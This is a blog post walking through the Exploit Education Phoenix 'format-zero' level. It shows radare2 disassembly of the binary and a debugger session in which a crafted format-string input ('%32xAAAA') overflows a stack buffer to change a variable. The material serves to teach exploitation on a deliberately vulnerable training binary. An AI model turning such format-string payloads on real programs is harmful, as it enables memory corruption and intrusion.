---
layout: post
title:  "Phoenix x86 Format Zero"
date: "2019-10-16 18:21:00 +0300"
categories: exploit-education phoenix x86
---

This series of format levels is all about exploiting format strings and the first level introduces a simple format string vulnerability.

{% highlight shell %}
$ rabin2 -I /opt/phoenix/i486/format-zero 
arch     x86
baddr    0x8048000
binsz    3736
bintype  elf
bits     32
canary   false
class    ELF32
compiler GCC: (GNU) 7.3.0
crypto   false
endian   little
havecode true
intrp    /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  Intel 80386
maxopsz  16
minopsz  1
nx       false
os       linux
pcalign  0
pic      false
relocs   true
relro    no
rpath    /opt/phoenix/i486-linux-musl/lib
sanitiz  false
static   false
stripped false
subsys   linux
va       true
{% endhighlight %}

It seems that the binary doesn't differ from the ones of the previous levels.

{% highlight shell %}
$ r2 /opt/phoenix/i486/format-zero 
{% endhighlight %}

{% highlight shell %}
[0xf7ee6d4b]> aas
Cannot analyze at 0x08048620
[0xf7ee6d4b]> afl
0x0804831c    1 17           sym._init
0x080484f0    7 277  -> 112  sym.frame_dummy
0x080485e0    5 49           sym.__do_global_ctors_aux
0x08049878    1 1924         obj.stdin
0x08048611    1 12           sym._fini
0x08048470    8 113  -> 111  sym.__do_global_dtors_aux
0x08048114   54 556  -> 674  sym..interp
0x080483a0    1 62           entry0
0x08048390    1 6            sym.imp.__libc_start_main
0x08048708    1 14           loc.__GNU_EH_FRAME_HDR
0x08048724    3 34           sym..eh_frame
0x08049798    1 2145         obj._DYNAMIC
0x08048760    1 10           obj.__EH_FRAME_BEGIN
0x080483e0    4 49   -> 40   sym.deregister_tm_clones
0x0804978c    1 4            obj.__CTOR_END
0x08048784    1 4            obj.__FRAME_END
0x08049794    1 2149         obj.__DTOR_END
0x08048535    6 156          main
0x08048350    1 6            sym.imp.puts
0x08048340    1 6            sym.imp.fgets
0x08048360    1 6            sym.imp.errx
0x08048370    1 6            sym.imp.sprintf
0x08048380    1 6            sym.imp.exit
[0xf7ee6d4b]> s main
[0x08048535]> pdf
/ (fcn) main 156
|   int main (int argc, char **argv, char **envp);
|           ; var int32_t var_3ch @ ebp-0x3c
|           ; var int32_t var_2dh @ ebp-0x2d
|           ; var int32_t var_2ch @ ebp-0x2c
|           ; var int32_t var_ch @ ebp-0xc
|           ; arg int32_t arg_4h @ esp+0x4
|           ; DATA XREF from entry0 @ 0x80483d4
|           0x08048535      8d4c2404       lea ecx, [arg_4h]
|           0x08048539      83e4f0         and esp, 0xfffffff0
|           0x0804853c      ff71fc         push dword [ecx - 4]
|           0x0804853f      55             push ebp
|           0x08048540      89e5           mov ebp, esp
|           0x08048542      51             push ecx
|           0x08048543      83ec44         sub esp, 0x44
|           0x08048546      83ec0c         sub esp, 0xc
|           0x08048549      6820860408     push str.Welcome_to_phoenix_format_zero__brought_to_you_by_https:__exploit.education ; sym..rodata
|                                                                      ; 0x8048620 ; "Welcome to phoenix/format-zero, brought to you by https://exploit.education"
|           0x0804854e      e8fdfdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x08048553      83c410         add esp, 0x10
|           0x08048556      a178980408     mov eax, dword [obj.stdin]  ; obj.__TMC_END
|                                                                      ; [0x8049878:4]=0
|           0x0804855b      83ec04         sub esp, 4
|           0x0804855e      50             push eax
|           0x0804855f      6a0f           push 0xf                    ; 15
|           0x08048561      8d45c4         lea eax, [var_3ch]
|           0x08048564      50             push eax
|           0x08048565      e8d6fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x0804856a      83c410         add esp, 0x10
|           0x0804856d      85c0           test eax, eax
|       ,=< 0x0804856f      750f           jne 0x8048580
|       |   0x08048571      83ec08         sub esp, 8
|       |   0x08048574      686c860408     push str.Unable_to_get_buffer ; 0x804866c ; "Unable to get buffer"
|       |   0x08048579      6a01           push 1                      ; 1
|       |   0x0804857b      e8e0fdffff     call sym.imp.errx           ; void errx(int eval)
|       `-> 0x08048580      c645d300       mov byte [var_2dh], 0
|           0x08048584      c745f4000000.  mov dword [var_ch], 0
|           0x0804858b      83ec08         sub esp, 8
|           0x0804858e      8d45c4         lea eax, [var_3ch]
|           0x08048591      50             push eax
|           0x08048592      8d45d4         lea eax, [var_2ch]
|           0x08048595      50             push eax
|           0x08048596      e8d5fdffff     call sym.imp.sprintf        ; int sprintf(char *s, const char *format, ...)
|           0x0804859b      83c410         add esp, 0x10
|           0x0804859e      8b45f4         mov eax, dword [var_ch]
|           0x080485a1      85c0           test eax, eax
|       ,=< 0x080485a3      7412           je 0x80485b7
|       |   0x080485a5      83ec0c         sub esp, 0xc
|       |   0x080485a8      6884860408     push str.Well_done__the__changeme__variable_has_been_changed ; 0x8048684 ; "Well done, the 'changeme' variable has been changed!"
|       |   0x080485ad      e89efdffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x080485b2      83c410         add esp, 0x10
|      ,==< 0x080485b5      eb10           jmp 0x80485c7
|      |`-> 0x080485b7      83ec0c         sub esp, 0xc
|      |    0x080485ba      68bc860408     push str.Uh_oh___changeme__has_not_yet_been_changed._Would_you_like_to_try_again ; 0x80486bc ; "Uh oh, 'changeme' has not yet been changed. Would you like to try again?"
|      |    0x080485bf      e88cfdffff     call sym.imp.puts           ; int puts(const char *s)
|      |    0x080485c4      83c410         add esp, 0x10
|      |    ; CODE XREF from main @ 0x80485b5
|      `--> 0x080485c7      83ec0c         sub esp, 0xc
|           0x080485ca      6a00           push 0
\           0x080485cc      e8affdffff     call sym.imp.exit           ; void exit(int status)
[0x08048535]> agf
[0x08048535]>  # int main (int argc, char **argv, char **envp);
    .-----------------------------------------------------------------------------------------.
    |  0x8048535                                                                              |
    | (fcn) main 156                                                                          |
    |   int main (int argc, char **argv, char **envp);                                        |
    | ; var int32_t var_3ch @ ebp-0x3c                                                        |
    | ; var int32_t var_2dh @ ebp-0x2d                                                        |
    | ; var int32_t var_2ch @ ebp-0x2c                                                        |
    | ; var int32_t var_ch @ ebp-0xc                                                          |
    | ; arg int32_t arg_4h @ esp+0x4                                                          |
    | ; DATA XREF from entry0 @ 0x80483d4                                                     |
    | lea ecx, [arg_4h]                                                                       |
    | and esp, 0xfffffff0                                                                     |
    | push dword [ecx - 4]                                                                    |
    | push ebp                                                                                |
    | mov ebp, esp                                                                            |
    | push ecx                                                                                |
    | sub esp, 0x44                                                                           |
    | sub esp, 0xc                                                                            |
    | ; sym..rodata                                                                           |
    | ; 0x8048620                                                                             |
    | ; "Welcome to phoenix/format-zero, brought to you by https://exploit.education"         |
    | push str.Welcome_to_phoenix_format_zero__brought_to_you_by_https:__exploit.education    |
    | ; int puts(const char *s)                                                               |
    | call sym.imp.puts;[oa]                                                                  |
    | add esp, 0x10                                                                           |
    | ; obj.__TMC_END                                                                         |
    | ; [0x8049878:4]=0                                                                       |
    | mov eax, dword [obj.stdin]                                                              |
    | sub esp, 4                                                                              |
    | push eax                                                                                |
    | ; 15                                                                                    |
    | push 0xf                                                                                |
    | lea eax, [var_3ch]                                                                      |
    | push eax                                                                                |
    | ; char *fgets(char *s, int size, FILE *stream)                                          |
    | call sym.imp.fgets;[ob]                                                                 |
    | add esp, 0x10                                                                           |
    | test eax, eax                                                                           |
    | jne 0x8048580                                                                           |
    `-----------------------------------------------------------------------------------------'
            f t
            | |
            | '-------------------------------------.
            |                                       |
            |                                       |
        .----------------------------------.    .-------------------------------------------------.
        |  0x8048571                       |    |  0x8048580                                      |
        | sub esp, 8                       |    | mov byte [var_2dh], 0                           |
        | ; 0x804866c                      |    | mov dword [var_ch], 0                           |
        | ; "Unable to get buffer"         |    | sub esp, 8                                      |
        | push str.Unable_to_get_buffer    |    | lea eax, [var_3ch]                              |
        | ; 1                              |    | push eax                                        |
        | push 1                           |    | lea eax, [var_2ch]                              |
        | ; void errx(int eval)            |    | push eax                                        |
        | call sym.imp.errx;[oc]           |    | ; int sprintf(char *s, const char *format, ...) |
        `----------------------------------'    | call sym.imp.sprintf;[od]                       |
                                                | add esp, 0x10                                   |
                                                | mov eax, dword [var_ch]                         |
                                                | test eax, eax                                   |
                                                | je 0x80485b7                                    |
                                                `-------------------------------------------------'
                                                        f t
                                                        | |
                                                        | '---------------.
    .---------------------------------------------------'                 |
    |                                                                     |
.-----------------------------------------------------------------.   .-------------------------------------------------------------------------------------.
|  0x80485a5                                                      |   |  0x80485b7                                                                          |
| sub esp, 0xc                                                    |   | sub esp, 0xc                                                                        |
| ; 0x8048684                                                     |   | ; 0x80486bc                                                                         |
| ; "Well done, the 'changeme' variable has been changed!"        |   | ; "Uh oh, 'changeme' has not yet been changed. Would you like to try again?"        |
| push str.Well_done__the__changeme__variable_has_been_changed    |   | push str.Uh_oh___changeme__has_not_yet_been_changed._Would_you_like_to_try_again    |
| ; int puts(const char *s)                                       |   | ; int puts(const char *s)                                                           |
| call sym.imp.puts;[oa]                                          |   | call sym.imp.puts;[oa]                                                              |
| add esp, 0x10                                                   |   | add esp, 0x10                                                                       |
| jmp 0x80485c7                                                   |   `-------------------------------------------------------------------------------------'
`-----------------------------------------------------------------'       v
    v                                                                     |
    |                                                                     |
    '--------------------------------------------------------.            |
                                                             | .----------'
                                                             | |
                                                       .-----------------------------------.
                                                       |  0x80485c7                        |
                                                       | ; CODE XREF from main @ 0x80485b5 |
                                                       | sub esp, 0xc                      |
                                                       | push 0                            |
                                                       | ; void exit(int status)           |
                                                       | call sym.imp.exit;[oe]            |
                                                       `-----------------------------------'
{% endhighlight %}

Here are the key takeaways by disassembling the binary:
* There is a call to `fgets` that saves the input, which is read from *STDIN*, to a local variable, `var_3ch`, and restricts the size to 15 bytes.
* There is a call to `sprintf` that takes `var_3ch` as a format string and sends the formatted output to another local variable, `var_2ch`.
* The objective is to overwrite the local variable `var_ch`.

As can be seen from the above info, the variable `var_3ch` has a size of 16 bytes, considering that the next variable on the stack is `var_2ch` and `0x3c-0x2c=0x10`. The same applies to `var_2ch`, `0x2c-0xc=0x20` which is 32 bytes.

In order to overwrite `var_ch`, `var_2ch` needs to be overflown. To do that, one can simply use the `%x` or `%X` specifier. The aforementioned specifier is used to output unsigned hexadecimal integers. In this case, the output will be sent to `var_2ch` and to overflow it the amount of the specifiers needs to be more than 32. Note that `fgets` restricts the size to 15 bytes and to circumvent that, one can append `32` right after the percentage.

{% highlight shell %}
$ r2 -d /opt/phoenix/i486/format-zero
{% endhighlight %}

{% highlight nasm %}
[0xf7f72d4b]> aas
Cannot analyze at 0x08048620
[0x08048535]> db 0x08048596
[0x08048535]> dc
Welcome to phoenix/format-zero, brought to you by https://exploit.education
%32xAAAA
hit breakpoint at: 8048596
[0x08048596]> px/16xw 0xffb4f338-0x3c
0xffb4f2fc  0x78323325 0x41414141 0xf7fa000a 0x00000000  %32xAAAA........
0xffb4f30c  0x080482ec 0x00000000 0x00000000 0x00000000  ................
0xffb4f31c  0x00000000 0x00000000 0x00000000 0x00000000  ................
0xffb4f32c  0x00000000 0x00000000 0xffb4f350 0xffb4f3cc  ........P.......
[0x08048596]> px/xw 0xffb4f338-0xc
0xffb4f32c  0x00000000                                   ....
[0x08048596]> dso
hit breakpoint at: 804859b
[0x08048596]> px/16xw 0xffb4f338-0x3c
0xffb4f2fc  0x78323325 0x41414141 0xf7fa000a 0x00000000  %32xAAAA........
0xffb4f30c  0x20202020 0x20202020 0x20202020 0x20202020                  
0xffb4f31c  0x20202020 0x20202020 0x61663766 0x30343138          f7fa8140
0xffb4f32c  0x41414141 0x0000000a 0xffb4f350 0xffb4f3cc  AAAA....P.......
[0x08048596]> px/xw 0xffb4f338-0xc
0xffb4f32c  0x41414141                                   AAAA
[0x08048596]> dc
Well done, the 'changeme' variable has been changed!
{% endhighlight %}

## Conclusion
In this level the user can control the format string of `sprintf` and, by having that control, it could lead to stack-based buffer overflow.